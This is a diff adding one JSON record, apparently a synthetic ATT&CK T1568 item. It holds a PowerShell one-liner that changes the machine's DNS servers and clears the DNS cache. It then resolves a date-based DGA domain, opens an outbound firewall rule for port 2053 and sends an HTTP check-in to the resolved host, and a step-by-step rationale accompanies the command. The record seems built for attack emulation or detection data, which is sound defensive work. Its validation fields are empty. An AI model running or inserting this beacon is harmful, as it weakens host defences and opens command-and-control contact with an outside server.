@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $iface=(Get-DnsClient | Where-Object { $_.AddressFamily -eq 'IPv4' -and -not $_.InterfaceAlias.Contains('Loopback') } | Select-Object -First 1).InterfaceIndex; if($iface){ Set-DnsClientServerAddress -InterfaceIndex $iface -ServerAddresses @('1.1.1.1','9.9.9.9') -Validate; Clear-DnsClientCache; $dom=('edge{0}-{1}.updn.net' -f (Get-Random -Min 10 -Max 99),(Get-Date -Format 'yyDDD')); $ip=(Resolve-DnsName $dom -Type A -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress; if($ip){ netsh advfirewall firewall add rule name='out_2053' dir=out action=allow protocol=TCP remoteport=2053 | Out-Null; Invoke-WebRequest -Uri ('http://{0}:2053/hello' -f $ip) -Headers @{ Host=$dom } -TimeoutSec 5 -UseBasicParsing } } }",
+  "explanation": "Sets trusted DNS servers on the active interface, clears cache, resolves a DGA host, opens uncommon port 2053, and performs an HTTP check-in to the resolved IP using Host routing.",
+  "rationale_steps": [
+    "Temporarily direct DNS to specific resolvers for consistent answers.",
+    "Generate a time-based DGA domain and resolve it.",
+    "Permit outbound connectivity to a non-standard port.",
+    "Initiate a check-in using Host header for domain continuity."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-76c8a0cd",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
